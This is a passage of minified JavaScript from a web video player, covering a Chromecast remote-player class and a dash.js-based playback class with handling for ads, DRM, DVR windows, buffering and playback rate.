T("seekingStart")))},selectAudio:function(b){},selectSubtitles:function(b){},volume:function(b){this.volumeLevel=b,null!=this.remotePlayer&&null!=this.remotePlayerController&&(this.remotePlayer.volumeLevel=b,this.remotePlayerController.setVolumeLevel())},onVolumeChange:function(b){null!=b&&null!=b.data&&this.volume(b.data)},onMuteChange:function(b){null!=this.remotePlayer&&null!=this.remotePlayerController&&0==this.remotePlayer.isMuted&&this.remotePlayerController.muteOrUnmute()},onUnMuteChange:function(b){null!=this.remotePlayer&&null!=this.remotePlayerController&&1==this.remotePlayer.isMuted&&this.remotePlayerController.muteOrUnmute()},setData:function(b){if(this.media=b,this.mediaVmapUrl=this.mediaVmapResponse=null,null!=this.variables.freewheel){null!=this.variables.freewheel.testFeed&&(this.mediaVmapResponse=this.variables.freewheel.testFeed,this.variables.freewheel.testFeed=""),null!=this.variables.freewheel.testFeedUrl&&(this.mediaVmapUrl=this.variables.freewheel.testFeedUrl,this.variables.freewheel.testFeedUrl="");var c=new Q("feedUpdate");c.data="",c.dispatch(this.context)}null!=this.castSession&&10<=this.state&&(b.mediaPlaybackInfo.isPlaying=!0,this.setupMedia())},saveBandwidthModeVisibilityChange:function(b){},__class__:Nc};var uf=function(){};wa["bs.player.plugin.video.videoPlayer.HlsJsFactory"]=uf,uf.__name__="bs.player.plugin.video.videoPlayer.HlsJsFactory",uf.create=function(b){return null==b&&(b={}),new pb.hls(b)};var gc=function(b){this.saveBandwidthModeStore=null,this.hideVideoTag=!1,this.playbackRate=1,this.isAdvertisement=this.isInStreamAdvertisement=this.initialAsAdvertisement=!1,this.minAudioTracksForInfo=2,null==gc.instances.h[(b?"ad_":"")+this.context]&&(this.pluginConfig=Kb.readPluginConfig(this),this.initialAsAdvertisement=this.isAdvertisement=b,this.initialBandwidthSafetyFactor=null,this.isInStreamAdvertisement=!1,this.playbackRateMetter=new se(h.isSmartTV()?3:2),this.seekingOverVideoGapMeter=new pf(4),this.playerWrapper=null,this.startTimeStatus=0,this.hasQualityInfoInitialized=this.hasCodecInfoInitialized=this.hasSubtitlesInitialized=this.hasAudioInitialized=this.hasDashJsInitializedManifest=this.hasDashJsInitializedSource=!1,this.isQualitySelectionEnabled=!0,this.hasPlaybackSuccStarted=this.isPlaybackNotAllowed=this.shouldBePlaying=this.isBuffering=this.hasProtectionData=this.hasSeekingStartTriggeded=!1,this.drmLicenseCheckStatus=0,this.liveStreamNowOffset=null,this.videoRestartsOnError=this.liveStreamNowOffsetLastUpdate=0,this.currentTime=this.lastDvrWindowEnd=this.lastDvrWindowStart=this.seekingTargetTs=this.seekingTargetPos=this.seekDebouncerTimer=this.seekingStartDate=this.prePlaybackSeekRelativePosition=null,this.playbackRateMetter.reset(),this.subtitlesSetWaitingForSelection=this.audioSetWaitingForSelection=null,this.seekingAvgTime=6,this.scte35PendingEvents=[],this.saveBandwidthModeStore=null)};wa["bs.player.plugin.video.videoPlayer.VideoDashJs"]=gc,gc.__name__="bs.player.plugin.video.videoPlayer.VideoDashJs",gc.__interfaces__=[pa,S],gc.canPlay=function(b){return!("Microsoft Internet Explorer"==h.browserName&&11>h.majorVersion||0==h.isMediaSourceExtensionSupported())&&(1<b.url.toLowerCase().indexOf(".ism/manifest")||1<b.url.toLowerCase().indexOf(".isml/manifest")||1<b.url.toLowerCase().indexOf(".mpd"))},gc.getInstance=function(b,c){var d=c?"ad_":"";return Object.prototype.hasOwnProperty.call(gc.instances.h,d+b)?gc.instances.h[d+b]:(c=new gc(c),gc.instances.h[d+b]=c,c.context=b,c.create(),c)},gc.prototype={minAudioTracksForInfo:null,context:null,variables:null,isAdvertisement:null,isInStreamAdvertisement:null,inStreamAdvertStartPos:null,initialAsAdvertisement:null,initialBandwidthSafetyFactor:null,inStreamAdvertMedia:null,adBreaksInfo:null,video:null,pluginConfig:null,playerWrapper:null,player:null,s73Wrapper:null,media:null,source:null,currentTime:null,playbackRateMetter:null,subtitlesRenderer:null,startTimeStatus:null,hasPlaybackSuccStarted:null,firefoxDrmDecodeLagTimerTs:null,firefoxDrmDecodeLag:null,initialVideoIsMuted:null,hasDashJsInitializedSource:null,hasDashJsInitializedManifest:null,hasAudioInitialized:null,hasSubtitlesInitialized:null,hasQualityInfoInitialized:null,isQualitySelectionEnabled:null,hasCodecInfoInitialized:null,hasSeekingStartTriggeded:null,hasProtectionData:null,isBuffering:null,drmLicenseCheckMechanismTimeoutTimer:null,drmLicenseCheckStatus:null,shouldBePlaying:null,isPlaybackNotAllowed:null,liveStreamNowOffset:null,liveStreamNowOffsetLastUpdate:null,videoRestartsOnError:null,lastRestartTs:null,liveStreamRestartTimeoutTimer:null,liveStreamRestartDelayTimer:null,streamCompleteWatchdogTimer:null,streamBufferingWatchdogTimer:null,prePlaybackSeekRelativePosition:null,seekingStartDate:null,seekingTargetPos:null,seekingTargetTs:null,seekingAvgTime:null,seekDebouncerTimer:null,seekableInitialRange:null,lastDvrWindowStart:null,lastDvrWindowEnd:null,liveEdgeUpdateTimer:null,dvrWindowStartTimeTs:null,dvrWindowEndTimeTs:null,audioSetWaitingForSelection:null,subtitlesSetWaitingForSelection:null,subtitlesSelected:null,scte35PendingEvents:null,lastGapEnd:null,seekingOverVideoGapMeter:null,playbackRate:null,hideVideoTag:null,saveBandwidthModeStore:null,create:function(){W.add(this.context,"selectSubtitles",U(this,this.onSelectSubtitles)),W.add(this.context,"selectAudio",U(this,this.onSelectAudio)),W.add(this.context,"requestVideoQualityChange",U(this,this.onVideoQualityChange)),Q.add(this.context,"adInStreamPlaying",U(this,this.onAdInStreamPlaying)),Q.add(this.context,"adInStreamPlayingSilent",U(this,this.onAdInStreamPlaying)),Q.add(this.context,"adInStreamEnd",U(this,this.onAdInStreamEnd)),Q.add(this.context,"adInStreamEndSilent",U(this,this.onAdInStreamEnd)),Q.add(this.context,"adInStreamClipPlaying",U(this,this.onAdClipInStreamPlaying)),Q.add(this.context,"adInStreamClipPlayingSilent",U(this,this.onAdClipInStreamPlaying)),Q.add(this.context,"adInStreamClipEnd",U(this,this.onAdClipInStreamEnd)),Q.add(this.context,"adInStreamClipEndSilent",U(this,this.onAdClipInStreamEnd)),Q.add(this.context,"adInStreamAdsBreaksInfo",U(this,this.onAdInStreamBreaksInfo))},destroy:function(){W.remove(this.context,"selectSubtitles",U(this,this.onSelectSubtitles)),W.remove(this.context,"selectAudio",U(this,this.onSelectAudio)),W.remove(this.context,"requestVideoQualityChange",U(this,this.onVideoQualityChange)),Q.remove(this.context,"adInStreamPlaying",U(this,this.onAdInStreamPlaying)),Q.remove(this.context,"adInStreamPlayingSilent",U(this,this.onAdInStreamPlaying)),Q.remove(this.context,"adInStreamEnd",U(this,this.onAdInStreamEnd)),Q.remove(this.context,"adInStreamEndSilent",U(this,this.onAdInStreamEnd)),Q.remove(this.context,"adInStreamClipPlaying",U(this,this.onAdClipInStreamPlaying)),Q.remove(this.context,"adInStreamClipPlayingSilent",U(this,this.onAdClipInStreamPlaying)),Q.remove(this.context,"adInStreamClipEnd",U(this,this.onAdClipInStreamEnd)),Q.remove(this.context,"adInStreamClipEndSilent",U(this,this.onAdClipInStreamEnd)),Q.remove(this.context,"adInStreamAdsBreaksInfo",U(this,this.onAdInStreamBreaksInfo)),this.cleanVideoAndPlayer(),this.media=null,this.startTimeStatus=0,this.liveStreamNowOffset=this.hasQualityInfoInitialized=this.hasCodecInfoInitialized=this.hasSubtitlesInitialized=this.hasAudioInitialized=this.hasDashJsInitializedManifest=this.hasDashJsInitializedSource=null,this.videoRestartsOnError=this.liveStreamNowOffsetLastUpdate=0,this.isBuffering=this.hasProtectionData=this.hasSeekingStartTriggeded=!1,this.stopLiveStreamRestartTimeoutTimer(),this.stopLiveStreamRestartDelayTimer(),this.stopDrmLiceseCheckCleanupTimer(),this.stopLiveEdgeUpdateTimer(),this.stopStreamCompleteWatchdogTimer(),this.stopStreamBufferingWatchdogTimer(),this.hasPlaybackSuccStarted=this.isPlaybackNotAllowed=this.shouldBePlaying=!1,this.drmLicenseCheckStatus=0,this.seekingStartDate=this.subtitlesSetWaitingForSelection=this.audioSetWaitingForSelection=null,this.stopSeekDebouncerTimer(),this.currentTime=this.lastDvrWindowEnd=this.lastDvrWindowStart=null,this.playbackRateMetter.reset(),this.adBreaksInfo=null},cleanVideoAndPlayer:function(){if(this.hasProtectionData=!1,this.stopDrmLiceseCheckCleanupTimer(),null!=this.player)try{this.hasDashJsInitializedSource&&this.player.pause(),this.player.reset()}catch(c){}if(null!=this.video){this.video.setAttribute("src",""),this.video.load(),this.hideVideoTag=!1;var b=!0;null==b&&(b=!0),null!=this.video&&(this.video.style.display=b?"block":"none",this.video.style.opacity=b?"1":"0",this.video.style.visibility=b?"visible":"hidden"),this.video.muted=this.initialVideoIsMuted}this.cleanPlayer(),this.subtitlesSetWaitingForSelection=this.audioSetWaitingForSelection=this.source=this.playerWrapper=this.video=this.player=null,this.hasPlaybackSuccStarted=!1,this.saveBandwidthModeStore=null},showHideVideoTag:function(b){null==b&&(b=!0),null!=this.video&&(this.video.style.display=b?"block":"none",this.video.style.opacity=b?"1":"0",this.video.style.visibility=b?"visible":"hidden")},stopSeekDebouncerTimer:function(){null!=this.seekDebouncerTimer&&(this.seekDebouncerTimer.stop(),this.seekDebouncerTimer=null)},onAdInStreamPlaying:function(b){if(this.isInStreamAdvertisement=this.isAdvertisement=!0,null!=(b=this.getAdsInStreamMaxQualityScalingRatio())){var c=this.player.getSettings();null!=c&&null!=c.streaming&&null!=c.streaming.abr&&null!=c.streaming.abr.bandwidthSafetyFactor&&(this.initialBandwidthSafetyFactor=c.streaming.abr.bandwidthSafetyFactor),null==this.initialBandwidthSafetyFactor&&(this.initialBandwidthSafetyFactor=.9),c.streaming.abr.bandwidthSafetyFactor=this.initialBandwidthSafetyFactor*b,this.player.updateSettings(c)}},getAdsInStreamMaxQualityScalingRatio:function(){var b=null;return Object.prototype.hasOwnProperty.call(this.pluginConfig,"daiAdsMaxQualityScalingRatio")&&null!=m.field(this.pluginConfig,"daiAdsMaxQualityScalingRatio")&&(b=m.field(this.pluginConfig,"daiAdsMaxQualityScalingRatio")),b},onAdInStreamEnd:function(b){this.isAdvertisement=this.initialAsAdvertisement,this.isInStreamAdvertisement=!1,null!=this.getAdsInStreamMaxQualityScalingRatio()&&null!=this.initialBandwidthSafetyFactor&&((b=this.player.getSettings()).streaming.abr.bandwidthSafetyFactor=this.initialBandwidthSafetyFactor,this.player.updateSettings(b))},onAdClipInStreamPlaying:function(b){null!=this.video&&null!=this.media&&(this.inStreamAdvertStartPos=this.video.currentTime,null!=b.data&&0<=b.data.adStartTime&&(this.inStreamAdvertStartPos=b.data.adStartTime),this.inStreamAdvertMedia=null,null!=b&&null!=b.data&&(this.inStreamAdvertMedia=b.data.media))},onAdClipInStreamEnd:function(b){this.inStreamAdvertMedia=this.inStreamAdvertStartPos=null},onAdInStreamBreaksInfo:function(b){null!=b&&null!=b.data&&(this.adBreaksInfo=b.data)},updateMediaPlaybackInfo:function(){if(null!=this.media&&this.hasAudioInitialized){var b=this.media instanceof xa;if(this.media.mediaPlaybackInfo.currentTime=this.currentTime,b&&(this.media.mediaPlaybackInfo.currentTime=86400<this.video.currentTime&&null==this.seekingTargetTs?this.video.currentTime:0<this.seekingTargetTs?this.seekingTargetTs:this.dvrWindowRelativeTimeToTs(this.currentTime)),this.media.mediaPlaybackInfo.isPlaying=!this.video.paused,this.media.mediaPlaybackInfo.currentTotalBitrateKpbs=this.getCurrentTotalBitrateKbps(),this.media.mediaPlaybackInfo.playbackRate=this.getPlaybackRate(),this.playbackRateMetter.setCurrentTime(this.media.mediaPlaybackInfo.currentTime,null,this.video.paused),b){b=this.media;var c=this.getDVRWindowRange();c.end<c.start&&(c=this.getSeekableRange(),this.media.mediaPlaybackInfo.currentTime=this.video.currentTime),b.dvrWindowLength=c.end-c.start,b.dvrWindowLiveEdge=c.end}}},dispatchEvent:function(b,c){var d=0,q=null,X=this.currentTime;null!=this.video&&(d=this.video.duration,q=this.video.currentSrc,!isNaN(d)&&null!=d||null==this.media||(d=this.media.duration),this.updateMediaPlaybackInfo(),null!=this.media&&this.hasAudioInitialized&&this.media instanceof xa&&(d=this.media.dvrWindowLength,null!=this.dvrWindowStartTimeTs&&null!=this.dvrWindowEndTimeTs&&(d=this.dvrWindowEndTimeTs-this.dvrWindowStartTimeTs))),this.isInStreamAdvertisement&&0<=this.inStreamAdvertStartPos&&(X=this.video.currentTime-this.inStreamAdvertStartPos,null!=this.inStreamAdvertMedia&&(d=this.inStreamAdvertMedia.duration),X>d&&(X=d),0==this.video.currentTime&&0>X&&(X=d,null!=this.media&&null!=this.media.mediaPlaybackInfo&&(this.media.mediaPlaybackInfo.currentTime=this.inStreamAdvertStartPos+d)),0>X&&0<=this.currentTime-this.inStreamAdvertStartPos&&(X=this.currentTime-this.inStreamAdvertStartPos)),null!=this.media&&null!=this.media.mediaPlaybackInfo&&0<this.scte35PendingEvents.length&&this.processPendingScte35Events(),b.data={duration:d,currentTime:X,source:q,media:this.media,additionalData:c},this.isPlaybackNotAllowed&&(null==b.data.additionalData&&(b.data.additionalData={}),b.data.additionalData.isPlaybackNotAllowed=!0),null!=(c=this.getThroughput())&&(null==b.data.additionalData&&(b.data.additionalData={}),b.data.additionalData.throughput=c),b.dispatch(this.context)},attachSubtitlesRenderer:function(b){this.subtitlesRenderer=b},attachVideo:function(b){if(this.video!=b||this.hasProtectionData){null==this.playerWrapper&&(this.playerWrapper=new qf),this.cleanPlayer(),Object.prototype.hasOwnProperty.call(this.variables,"qualitySelectionEnabled")&&(this.isQualitySelectionEnabled=m.field(this.variables,"qualitySelectionEnabled")),this.video=b,null!=this.video&&1==this.video.muted&&1!=this.initialVideoIsMuted&&(this.initialVideoIsMuted=!0);var c={streaming:{fastSwitchEnabled:!h.isSmartTV(),lowLatencyEnabled:!1,lastMediaSettingsCachingInfo:{enabled:!1}}};Object.prototype.hasOwnProperty.call(this.variables,"saveBandwidthMode")&&fb.__cast(this.variables.saveBandwidthMode,be)&&(c.streaming.abr={limitBitrateByPortal:!0,usePixelRatioInLimitBitrateByPortal:!0});var d=this.getQualityInitialBandwidthKbs();if(null!=d&&!isNaN(d)&&isFinite(d)&&(c.streaming.abr={initialBitrate:{video:d}}),this.player=this.playerWrapper.getMediaPlayer(),Object.prototype.hasOwnProperty.call(this.variables,"system73")&&0==this.videoRestartsOnError&&window.BigInt&&window.S73DashjsWrapper&&!this.isAdvertisement&&(this.s73Wrapper=S73DashjsWrapper(m.field(this.variables,"system73"),{dashjs:window.bradmax.dashjs}),this.s73Wrapper.wrapPlayer(this.player)),this.player.initialize(b),this.initSubtitlesPlaceholder(),this.player.updateSettings(c),Object.prototype.hasOwnProperty.call(this.pluginConfig,"dashSettings")&&null!=m.field(this.pluginConfig,"dashSettings")){b=m.field(this.pluginConfig,"dashSettings");try{if(null!=m.field(b,"lowEndDevicesSettings")){var q=m.field(b,"lowEndDevicesSettings");m.deleteField(b,"lowEndDevicesSettings"),0<q.enableForJsHeapSizeLowerThan&&window.performance.memory.jsHeapSizeLimit<q.enableForJsHeapSizeLowerThan&&null!=q.settings&&(b=q.settings)}}catch(X){q=yb.caught(X).unwrap(),console.error(q)}this.player.updateSettings(b)}this.updateAutoSwitchQuality(!0),this.player.setProtectionData(null),this.player.on("metricAdded",U(this,this.onDashJsMetricAdded)),this.player.on("qualityChangeRequested",U(this,this.onDashJsQualityChangeRequested)),this.player.on("public_keySessionCreated",U(this,this.onDashJsKeySessionCreated)),this.player.on("error",U(this,this.onDashJsError)),this.player.on("playbackStarted",U(this,this.onDashJsPlaybackStarted)),this.player.on("playbackNotAllowed",U(this,this.onDashJsPlaybackNotAllowed)),this.player.on("public_licenseRequestComplete",U(this,this.onDashJsLicenseRequestComplete)),this.player.on("inbandEvents",U(this,this.onScte35InbandEvents)),this.player.on("gapCausedInternalSeek",U(this,this.onSeekingOverVideoGap)),this.player.on("gapCausedSeekToPeriodEnd",U(this,this.onSeekingOverVideoGap)),this.video.addEventListener("pause",U(this,this.onDashJsPause)),this.video.addEventListener("play",U(this,this.onDashJsPlay)),this.video.addEventListener("playing",U(this,this.onDashJsPlaying)),this.video.addEventListener("timeupdate",U(this,this.onDashJsTimeupdate)),this.video.addEventListener("durationchange",U(this,this.onDashJsDurationchange)),this.video.addEventListener("waiting",U(this,this.onDashJsWaiting)),this.video.addEventListener("ended",U(this,this.onDashJsEnded)),this.video.addEventListener("seeked",U(this,this.onDashJsSeeked)),null!=this.video.textTracks&&this.video.textTracks.addEventListener("addtrack",U(this,this.onAddTrack)),this.video.addEventListener("ratechange",U(this,this.onVideoRateChange)),this.checkPlaybackRate(),this.triggerVideoPlaybackRateEvent()}},setPlaybackRate:function(b){this.isAdvertisement||(this.playbackRate=b,this.checkPlaybackRate())},getPlaybackRate:function(){return null==this.player?1:this.player.getPlaybackRate()},onVideoRateChange:function(b){this.triggerVideoPlaybackRateEvent()},triggerVideoPlaybackRateEvent:function(){if(!this.isAdvertisement){var b=new T("playbackRate");b.data=this.getPlaybackRate(),b.dispatch(this.context)}},checkPlaybackRate:function(){this.isAdvertisement||isNaN(this.playbackRate)||this.getPlaybackRate()==this.playbackRate||this.player.setPlaybackRate(this.playbackRate)},cleanPlayer:function(){if(null!=this.s73Wrapper){try{this.s73Wrapper.destroy()}catch(b){}this.s73Wrapper=null}null!=this.video&&(this.video.removeEventListener("pause",U(this,this.onDashJsPause)),this.video.removeEventListener("play",U(this,this.onDashJsPlay)),this.video.removeEventListener("playing",U(this,this.onDashJsPlaying)),this.video.removeEventListener("timeupdate",U(this,this.onDashJsTimeupdate)),this.video.removeEventListener("durationchange",U(this,this.onDashJsDurationchange)),this.video.removeEventListener("waiting",U(this,this.onDashJsWaiting)),this.video.removeEventListener("ended",U(this,this.onDashJsEnded)),this.video.removeEventListener("seeked",U(this,this.onDashJsSeeked)),null!=this.video.textTracks&&this.video.textTracks.removeEventListener("addtrack",U(this,this.onAddTrack)),this.video.removeEventListener("ratechange",U(this,this.onVideoRateChange))),null!=this.player&&(this.player.off("metricAdded",U(this,this.onDashJsMetricAdded)),this.player.off("qualityChangeRequested",U(this,this.onDashJsQualityChangeRequested)),this.player.off("public_keySessionCreated",U(this,this.onDashJsKeySessionCreated)),this.player.off("error",U(this,this.onDashJsError)),this.player.off("playbackStarted",U(this,this.onDashJsPlaybackStarted)),this.player.off("playbackNotAllowed",U(this,this.onDashJsPlaybackNotAllowed)),this.player.off("public_licenseRequestComplete",U(this,this.onDashJsLicenseRequestComplete)),this.player.off("inbandEvents",U(this,this.onScte35InbandEvents)),this.player.off("gapCausedInternalSeek",U(this,this.onSeekingOverVideoGap)),this.player.off("gapCausedSeekToPeriodEnd",U(this,this.onSeekingOverVideoGap)),this.reset(),this.video=this.player=null)},isPaused:function(){return null==this.video||this.video.paused},onDashJsPause:function(b){return null==this.seekDebouncerTimer&&this.dispatchEvent(this.isAdvertisement?new Q("adPaused"):new T("paused")),!(this.media instanceof xa)&&null!=this.video&&0<this.video.currentTime&&.5>Math.abs(this.video.currentTime-this.video.duration)&&(this.streamCompleteWatchdogTimer=Rb.delay(U(this,this.onStreamCompleteWatchdogTimeout),1e3)),null},onDashJsPlay:function(b){return this.isFirefoxStillDecodingAfterBuffering()||(this.checkPlaybackRate(),this.dispatchEvent(this.isAdvertisement?new Q("adPlaying"):new T("playing"))),null},isFirefoxStillDecodingAfterBuffering:function(){return"Firefox"==h.browserName&&null!=this.video&&0==this.video.playbackRate},onDashJsPlaying:function(b){return this.hasSeekingStartTriggeded&&this.onDashJsSeeked({dashFakeEventFix:!0}),b=h.isSmartTV()&&!this.playbackRateMetter.isPlayingNormal(!0),this.isFirefoxStillDecodingAfterBuffering()||b?(this.firefoxDrmDecodeLagTimerTs=this.getNowTs(),this.shouldBufferingBeVisible()&&(this.dispatchEvent(new T("bufferingStart")),this.isBuffering=!0)):(null!=this.firefoxDrmDecodeLagTimerTs&&(this.firefoxDrmDecodeLag=this.getNowTs()-this.firefoxDrmDecodeLagTimerTs,this.firefoxDrmDecodeLagTimerTs=null),this.dispatchEvent(this.isAdvertisement?new Q("adPlaying"):new T("playing"))),this.initializePlaybackStartTimeIfNeeded(),this.stopLiveStreamRestartTimeoutTimer(),this.stopLiveStreamRestartDelayTimer(),this.stopStreamBufferingWatchdogTimer(),!this.isFirefoxStillDecodingAfterBuffering()&&this.isBuffering&&!b&&null!=this.video&&(0<this.video.playbackRate||null==this.video.playbackRate)&&(this.dispatchEvent(new T("bufferingEnd")),this.isBuffering=!1),null},initializePlaybackStartTimeIfNeeded:function(){if(0==this.startTimeStatus&&null!=this.video){var b=this.media instanceof xa?4:1;if(h.isSmartTV()&&!h.isSamsungSmartTVTizen&&(b=4),this.video.readyState>=b){this.startTimeStatus=1,this.onDashJsDurationchange({});var c=b=this.getPlaybackStartTime(this.media);0<b&&this.hasDashJsInitializedSource?(this.media instanceof xa&&(b=this.normalizeDvrTime(b),(c=this.dvrTimestampToRelativeTime(b))<=this.getLiveMinimalInitialOffsetForOldestPart()&&(c="Firefox"==h.browserName&&null!=this.firefoxDrmDecodeLag?1.25*this.firefoxDrmDecodeLag+this.getLiveMinimalInitialOffsetForOldestPart():this.getLiveMinimalInitialOffsetForOldestPart(),b=this.dvrWindowRelativeTimeToTs(c))),c<this.video.duration?(this.currentTime=c,this.updateMediaPlaybackInfo(),this.performPlayerSeek(b,!1)):(this.startTimeStatus=2,this.onStartTimeInitFinalized(),console.warn("Warning: Start time is ignored. Start time for video got invalid value (startTime: "+b+", duration:"+this.video.duration+")."))):(this.startTimeStatus=2,this.onStartTimeInitFinalized())}}null!=this.prePlaybackSeekRelativePosition&&1<=this.video.readyState&&(b=this.prePlaybackSeekRelativePosition,this.prePlaybackSeekRelativePosition=null,0<this.video.duration&&2<Math.abs(this.video.duration-this.media.duration)&&(this.seek(b*this.video.duration),this.pause()))},onStartTimeInitFinalized:function(){this.media instanceof xa&&null!=this.video&&!this.video.paused&&!this.shouldBePlaying&&this.player.pause()},onDashJsTimeupdate:function(b){b=this.media instanceof xa;var c=null!=this.dvrWindowStartTimeTs||null!=this.dvrWindowEndTimeTs,d=this.getNowTs();if(this.playbackRateMetter.isPlayingNormal()&&0<this.lastRestartTs&&30<d-this.lastRestartTs&&(this.videoRestartsOnError=0),this.stopDrmLiceseCheckCleanupTimer(),this.stopStreamBufferingWatchdogTimer(),h.isSamsungSmartTVTizen&&this.initializePlaybackStartTimeIfNeeded(),!this.hasPlaybackSuccStarted&&null!=this.video&&4<=this.video.readyState&&0<this.currentTime&&(this.hasPlaybackSuccStarted=!0,this.selectAudioAndSubtitlesAfterInitialization()),b&&!c&&null==this.liveStreamNowOffset){var q=this.getDVRWindowRange();if(!(null==q||0>=q.end)){this.liveStreamNowOffset=d-q.end,q=.025*(q.end-q.start);var X=null!=this.dvrWindowStartTimeTs||null!=this.dvrWindowEndTimeTs;!X&&0<this.liveStreamNowOffset&&this.liveStreamNowOffset<q&&(this.liveStreamNowOffset=0),this.liveStreamNowOffsetLastUpdate=d}}if(b&&c&&1<d-this.liveStreamNowOffsetLastUpdate&&(null==(q=this.getDVRWindowRange())||0>=q.end||(this.liveStreamNowOffset=d-q.end,q=.025*(q.end-q.start),!(X=null!=this.dvrWindowStartTimeTs||null!=this.dvrWindowEndTimeTs)&&0<this.liveStreamNowOffset&&this.liveStreamNowOffset<q&&(this.liveStreamNowOffset=0),this.liveStreamNowOffsetLastUpdate=d)),b&&null==this.liveEdgeUpdateTimer&&(this.liveEdgeUpdateTimer=new Rb(1e3),this.liveEdgeUpdateTimer.run=U(this,this.onLiveEdgeUpdate),this.seekableInitialRange=this.getSeekableRange()),!this.isPlaybackNotAllowed||this.isBuffering||null==this.video||this.video.paused||this.video.seeking||(this.isPlaybackNotAllowed=!1),2==this.startTimeStatus&&0<this.video.playbackRate&&1==this.hideVideoTag){this.hideVideoTag=!1,null==(c=!0)&&(c=!0),null!=this.video&&(this.video.style.display=c?"block":"none",this.video.style.opacity=c?"1":"0",this.video.style.visibility=c?"visible":"hidden"),c=!1,d=this.video.paused;try{this.video.muted=this.initialVideoIsMuted;var ra=!d&&this.video.paused;c=!this.initialVideoIsMuted&&this.video.muted!=this.initialVideoIsMuted||ra}catch(Wa){c=!0}c&&this.onDashJsPlaybackNotAllowed({})}if(.1>=this.video.currentTime||null==this.video.currentTime){if(0<this.lastGapEnd&&3>Math.abs(this.currentTime-this.lastGapEnd))return null;ra=!1;try{c=0;for(var Aa=this.video.buffered.length;c<Aa;){var Qa=c++;0>=this.video.buffered.start(Qa)&&0<=this.video.buffered.end(Qa)&&(ra=!0)}}catch(Wa){}if(!ra)return null}if(null==this.seekDebouncerTimer){if(Aa=this.video.currentTime,b&&(Aa=this.dvrWindowRelativeTimeFromTs(Aa)),null!=this.seekingTargetPos&&this.video.currentTime<this.seekingTargetPos&&this.seekingTargetPos-10<this.video.currentTime||null!=this.currentTime&&null!=Aa&&Aa<this.currentTime&&.1>=Aa)return null;this.seekingTargetPos=null,this.currentTime=Aa,this.updateMediaPlaybackInfo()}return 2==this.startTimeStatus&&this.dispatchEvent(this.isAdvertisement?new Q("adCurrentTimeChange"):new T("currentTimeChange")),this.isBuffering&&null!=this.video&&!this.video.paused&&!this.video.seeking&&4<=this.video.readyState&&this.playbackRateMetter.isPlayingNormal()&&(0<this.video.playbackRate||null==this.video.playbackRate)&&(this.dispatchEvent(new T("bufferingEnd")),this.isBuffering=!1),b&&null!=this.dvrWindowEndTimeTs&&2==this.startTimeStatus&&this.media.mediaPlaybackInfo.currentTime>this.dvrWindowEndTimeTs&&(new W("skinPause").dispatch(this.context),this.stopStreamCompleteWatchdogTimer(),this.dispatchEvent(this.isAdvertisement?new Q("adComplete"):new T("complete"))),null},processPendingScte35Events:function(){for(var b=0,c=0,d=this.scte35PendingEvents;c<d.length;){var q=d[c];if(++c,q.calculatedPresentationTime<=this.media.mediaPlaybackInfo.currentTime){var X=new aa("scte35Tag");X.data=q,X.dispatch(this.context),++b}}if(0<b){for(b=[],c=0,d=this.scte35PendingEvents;c<d.length;)q=d[c],++c,q.calculatedPresentationTime>this.media.mediaPlaybackInfo.currentTime&&b.push(q);this.scte35PendingEvents=b}},updateLastStreamNowOffsetParam:function(b){var c=this.getDVRWindowRange();null==c||0>=c.end||(this.liveStreamNowOffset=b-c.end,c=.025*(c.end-c.start),null==this.dvrWindowStartTimeTs&&null==this.dvrWindowEndTimeTs&&0<this.liveStreamNowOffset&&this.liveStreamNowOffset<c&&(this.liveStreamNowOffset=0),this.liveStreamNowOffsetLastUpdate=b)},onDashJsDurationchange:function(b){if(this.initializePlaybackStartTimeIfNeeded(),this.media instanceof va&&!(this.media instanceof xa)&&1/0==this.video.duration){b=new xa;for(var c=g.getInstanceFields(va),d=0;d<c.length;){var q=c[d];++d,b[q]=m.field(this.media,q)}this.media=b,(c=new aa("mediaAfterPlaybackStartMetadata")).data=b,c.dispatch(this.context)}if(this.media instanceof xa&&1/0!=this.video.duration&&0<this.video.duration){for(b=new va,c=g.getInstanceFields(va),d=0;d<c.length;)q=c[d],++d,b[q]=m.field(this.media,q);this.media=b,(c=new aa("mediaAfterPlaybackStartMetadata")).data=this.media,c.dispatch(this.context)}return this.media.duration=this.video.duration,this.dispatchEvent(this.isAdvertisement?new Q("adDurationChange"):new T("durationChange")),null},onDashJsWaiting:function(b){return this.androidVideoBufferFix(),this.shouldBufferingBeVisible()&&(this.dispatchEvent(new T("bufferingStart")),this.isBuffering=!0),this.stopStreamBufferingWatchdogTimer(),this.streamBufferingWatchdogTimer=Rb.delay(U(this,this.onStreamBufferingWatchdogTimeout),22e3),null},androidVideoBufferFix:function(){h.isAndroid&&"Chrome"==h.browserName&&null!=this.video&&(this.video.style.transform="rotate(0.1deg)")},shouldBufferingBeVisible:function(){var b=null!=this.getAdsInStreamMaxQualityScalingRatio(),c=!1;try{if(b&&null!=this.player&&null!=this.player.getActiveStream()&&null!=this.video){for(var d=this.player.getActiveStream().getProcessors(),q=0;q<d.length;){var X=d[q];++q;var ra=X.getBuffer().getBuffer().buffered;if(null!=ra)for(var Aa=0,Qa=ra.length;Aa<Qa;){var Wa=Aa++;.5>Math.abs(this.video.currentTime-ra.end(Wa))&&(c=!0)}}null!=this.lastGapEnd&&.5>Math.abs(this.video.currentTime-this.lastGapEnd)&&(c=!0)}}catch(Cb){}return!this.isInStreamAdvertisement&&!c||!b},onAddTrack:function(b){var c=this.isAdvertisement?new Q("addTrack"):new T(T.ADD_TRACK);c.data={track:b},c.dispatch(this.context)},onScte35InbandEvents:function(b){if(null!=b&&null!=b.events&&0<b.events.length){b=b.events;for(var c=0;c<b.length;){var d=b[c];++c,0<d.calculatedPresentationTime&&this.scte35PendingEvents.push(d)}}},onSeekingOverVideoGap:function(b){if(null!=b&&0<b.seekTime&&(this.lastGapEnd=b.seekTime),this.seekingOverVideoGapMeter.add(),4<this.seekingOverVideoGapMeter.getLoad()){var c=this.currentTime+3;0<this.media.duration&&!(this.media instanceof xa)||(this.player.pause(),this.handleVideoRestart()),this.seek(c)}null!=b&&10<b.duration&&(c=this.currentTime+1,this.player.pause(),this.media.mediaUserSettings.resumePostion=c,this.handleVideoRestart())},onDashJsEnded:function(b){return this.stopStreamCompleteWatchdogTimer(),this.dispatchEvent(this.isAdvertisement?new Q("adComplete"):new T("complete")),null},onDashJsSeeked:function(b){if(this.androidVideoBufferFix(),this.hasSeekingStartTriggeded=!1,1==this.startTimeStatus&&(this.startTimeStatus=2,this.onStartTimeInitFinalized(),this.shouldBePlaying&&this.play()),null!=this.seekingStartDate){var c=((new 